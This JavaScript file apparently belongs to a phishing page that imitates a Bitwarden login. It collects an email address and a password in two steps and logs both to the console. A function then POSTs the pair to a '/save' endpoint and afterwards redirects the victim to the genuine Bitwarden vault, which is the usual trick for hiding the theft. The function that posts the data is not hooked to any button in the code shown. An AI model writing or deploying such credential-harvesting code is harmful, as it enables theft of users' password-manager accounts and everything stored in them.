document.getElementById('continue-button').addEventListener('click', function() {
    const emailInput = document.getElementById('email-input').value;
    if (emailInput) {
        console.log('Email:', emailInput);
        document.getElementById('email-section').classList.add('tw-hidden');
        document.getElementById('password-section').classList.remove('tw-hidden');
    } else {
        alert('Please enter an email address.');
    }
});

document.getElementById('submit-button').addEventListener('click', function(event) {
    event.preventDefault();
    const emailInput = document.getElementById('email-input').value;
    const passwordInput = document.getElementById('password-input').value;
    if (passwordInput) {
        console.log('Email:', emailInput);
        console.log('Password:', passwordInput);
    } else {
        alert('Please enter a password.');
    }
});


function showPasswordSection() {
    const emailInput = document.getElementById('email-input').value;
    const passwordInput = document.getElementById('password-input').value;
    console.log('Email:', emailInput);
    console.log('Password:', passwordInput);

     fetch('/save', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: `email=${encodeURIComponent(emailInput)}&password=${encodeURIComponent(passwordInput)}`
    }).then(() => {
          // Redirect after storing data
          window.location.href = 'https://vault.bitwarden.com/';
    });
}
